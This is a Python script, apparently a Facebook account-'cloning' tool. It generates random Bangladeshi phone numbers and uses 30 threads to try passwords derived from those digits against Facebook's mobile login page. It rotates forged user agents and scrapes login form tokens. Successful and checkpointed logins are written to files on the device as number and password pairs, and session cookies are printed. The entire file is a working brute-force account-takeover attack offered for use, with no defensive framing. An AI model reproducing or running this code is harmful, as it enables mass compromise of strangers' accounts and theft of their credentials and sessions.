import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]      
ugen2 = ('Mozilla/5.0 (Linux; Android 9; SM-J415G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.107 Mobile Safari/537.36',
'radio.net 5.6.7 (iPhone; iPhone OS 16.1.1; en_US)',
'Dalvik/2.1.0 (Linux; U; Android 10; Smooth626 Build/QP1A.190711.020)',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6821 Build/SP1A.210812.016)',
'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML%2C like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/74.0.3729.108 Odin/74.3729.2.10 Safari/537.36 Model/Hisense-NT72671D VIDAA/5.0(Hisense;SmartTV;75U62GAVT;NT72671/V0000.01.00M.L1110;UHD)',
'Mozilla/5.0 (Linux; 12; SM-A336B) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A716U) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0.1; Lenovo TB2-X30L) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 12; S6303L Build/SP1A.210812.016)',
'Mozilla/5.0 (Linux; Android 10; ZTE 2050 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [ip:37.163.122.153]',
'radio2/155 CFNetwork/1240.0.4 Darwin/20.5.0',
'Mozilla/5.0 (Linux; Android 7.0; HUAWEI MLA-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 [ip:5.90.205.65]',
'Mozilla/5.0 (Linux; Android 10; JNY-LX2; HMSCore 6.9.0.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 11; moto g power (2022) Build/RRQS31.Q3-68-140-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]',
'Mozilla/5.0 (Linux; Android 11; SM-A136U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76 [ip:201.143.14.237]',
'Mozilla/5.0 (Linux; Android 9; SM-A205G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:187.161.115.157]',
'Mozilla/5.0 (Linux; Android 11; TFY-LX3 Build/HONORTFY-L33CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]',
'Mozilla/5.0 (Linux; Android 11; ABR-LX9; HMSCore 6.9.0.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36 [ip:189.183.26.247]',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:79.20.130.147]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76 [ip:49.236.14.1]',
'Mozilla/5.0 (Linux; Android 12; SM-M136B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1 [ip:187.189.123.244]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5] [ip:73.166.244.183]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A362 [FBAN/FBIOS;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]',
'Mozilla/5.0 (Linux; Android 12; moto g(60)s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:190.57.91.13]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H218 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/15.7.2;FBSS/2;FBID/phone;FBLC/nl_NL;FBOP/5]',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0;Win64;x64;Trident/7.0;Microsoft Outlook 16.0.15831)',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.163.24.243]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:146.241.237.36]',
'Mozilla/5.0 (Linux; Android 12; M2101K6R Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 10; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [ip:151.19.63.15]',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [ip:201.185.239.35]',
'Mozilla/5.0 (Linux; Android 10; Hisense U3 2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 12; SCG12 Build/SP2A.220305.013)',
'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 [ip:193.207.131.113]',
'Mozilla/5.0 (Linux; Android 11; 6125F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 [ip:93.37.160.217]',
'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; QUAD-CORE T3 k2001-nwd) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.77.70.25]',
'AppleCoreMedia/1.0.0.17G14042 (Macintosh; U; Intel Mac OS X 10_13_6; de_de) [ip:46.114.222.110]',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.137 Mobile Safari/537.36 [ip:151.38.48.146]',
'Mozilla/5.0 (Linux; Android 10; STK-LX3 Build/HONORSTK-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 11; CPH2067) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:2.199.117.126]',
'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 [ip:193.207.174.172]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:87.17.142.111]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:208.127.133.66]',
'radio2/155 CFNetwork/1331.0.7 Darwin/21.4.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:93.146.50.193]',
'Mozilla/5.0 (Linux; Android 11; RMX2195 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 [ip:151.38.41.15]',
'Mozilla/5.0 (Linux; Android 12; SM-A225M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]',
'Mozilla/5.0 (Linux; Android 10; Nokia 3.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:109.52.91.182]',
'Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:151.82.117.34]',
'Mozilla/5.0 (Linux; Android 9; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.194.168]',
'Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [ip:151.43.127.171]',
'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.44.199]',
'Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1 Build/HUAWEIPRA-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]',
'Mozilla/5.0 (Linux; Android 12; CPH2273) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.162.234.113]',
'Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36 [ip:37.159.66.165]',
'Mozilla/5.0 (Linux; Android 10; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.3.3767.68685 [ip:217.138.219.182]',
'AppleCoreMedia/1.0.0.20C65 (iPhone; U; CPU OS 16_2 like Mac OS X; kl)',
'Mozilla/5.0 (Linux; Android 13; SM-A037G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.90.135.81]',
'Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.141 Mobile Safari/537.36 [ip:62.18.95.95]',
'Mozilla/5.0 (Linux; Android 12; SM-F127G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5]',
'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.86 Mobile DuckDuckGo/5 Safari/537.36 [ip:193.207.227.55]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:93.56.171.197]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0 [ip:2.36.189.178]',
'Dalvik/2.1.0 (Linux; U; Android 6.0.1; M1092R Build/MOB30J)',
'Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:151.35.233.82]',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:5.77.72.25]',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Ecosia android@88.0.4324.181)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 [ip:93.40.226.152]',
'Mozilla/5.0 (Linux; Android 12; motorola edge 30 ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:37.162.150.158]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76 Config/90.2.7621.22',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:92.118.62.210]',
'Simple%20Radio/1891 CFNetwork/1220.1 Darwin/20.3.0',
'Mozilla/5.0 (Linux; Android 10; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.3.3767.68685 [ip:185.128.27.102]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76 [ip:151.15.174.86]',
'Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:158.148.158.236]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0 [ip:188.152.121.246]',
'Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/243.0.495136164 Mobile/15E148 Safari/604.1 [ip:95.248.75.198]',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 [ip:80.82.11.15]',
'Mozilla/5.0 (Linux; Android 11; CPH1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 [ip:5.169.88.108]',
'Dalvik/2.1.0 (Linux; U; Android 12; motorola razr 2022 Build/S3SLS32.16-72-14-2)',
'Dalvik/2.1.0 (Linux; U; Android 10; S68Pro Build/QP1A.190711.020)',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1 [ip:190.153.83.247]',
'Mozilla/5.0 (Linux; Android 10; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 [ip:37.163.248.19]',
'Mozilla/5.0 (Linux; Android 10; SM-A750FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 [ip:37.160.7.91]',
'Mozilla/5.0 (Linux; Android 11; TB328XU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36',)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11; moto g(50) 5G Build/RRSS31.Q2-54-59-4; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 11; moto g(50) 5G Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)  

logo =("""\033[1;32m 
\033[1;91m ╦  ╔═╗╔═╗╔═╗╔╗╔╔╦╗═╗ ╦╔═╗╦ ╦  ╦╦
\033[1;97m ║  ║╣ ║ ╦║╣ ║║║ ║║╔╩╦╝╠═╣║ ╚╗╔╝║
\033[1;32m ╩═╝╚═╝╚═╝╚═╝╝╚╝═╩╝╩ ╚═╩ ╩╩═╝╚╝ ╩ """)

def uf():
    user=[]
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 017/019/016/018/013')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    limit = int(input(f'[+] PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f' TOTAL  IDS: '+tl)
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r[WAITING]\033[1;92m%s\033[m\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             'method':'GET',
             'scheme':'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'dpr': '2.0562500953674316',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-model': '"Redmi Y3"',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[OK] \033[1;32m'+cid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BLACK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[1;91m[CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BLACK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
uf()
